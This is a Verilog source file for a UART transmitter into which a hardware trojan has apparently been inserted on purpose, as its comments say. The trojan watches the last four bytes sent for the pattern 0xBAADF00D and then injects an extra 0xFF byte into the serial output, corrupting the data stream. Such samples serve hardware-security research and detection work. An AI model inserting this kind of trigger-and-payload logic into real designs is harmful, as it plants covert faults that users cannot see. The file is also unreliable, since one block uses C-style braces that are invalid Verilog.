 module uart_tx (
    input clk,
    input rx_we,
    input [7:0] rx_data,
    output reg tx_busy = 1'b0,
    output reg tx_serial
);

    // Trojan variables
    reg [31:0] byte_sequence = 32'd0; // Store the last four bytes sent
    wire trojan_triggered = (byte_sequence == 32'hBAADF00D); // Trigger when "BAADF00D" pattern is detected

    // Standard UART transmission variables
    reg [9:0] data = 10'b1_11111111_1;
    reg [3:0] counter = 4'd0;
    reg [3:0] sent = 4'd0;
    reg trojan_active = 1'b0; // Indicates whether the trojan has been activated

    always @ (posedge clk) begin
        counter <= counter + 4'd1;

        if (counter == 4'd15)
            data <= {1'b1, data[9:1]};

        if (rx_we & ~tx_busy) begin
            sent <= 4'd0;
            tx_busy <= 1'b1;
            data <= {1'b1, rx_data, 1'b0};
            counter <= 4'd0;
            byte_sequence <= {byte_sequence[23:0], rx_data}; // Update the sequence of the last four bytes
        end

        if (tx_busy & (counter == 4'd14)) begin
            sent <= sent + 4'd1;

            if (sent == 4'd9) {
                tx_busy <= 1'b0;
                if (trojan_triggered) trojan_active <= 1'b1; // Activate the Trojan when the pattern is detected
            }
        end

        // Trojan activity - send an erroneous byte after the correct transmission
        if (trojan_active) begin
            if (!tx_busy) begin // Check if current transmission is completed
                tx_busy <= 1'b1; // Set to send the erroneous byte
                data <= {1'b1, 8'hFF, 1'b0}; // Erroneous byte to send, for example, 0xFF
                counter <= 4'd0;
                sent <= 4'd0;
                trojan_active <= 1'b0; // Reset the Trojan
            end
        end

        tx_serial <= data[0];
    end

endmodule
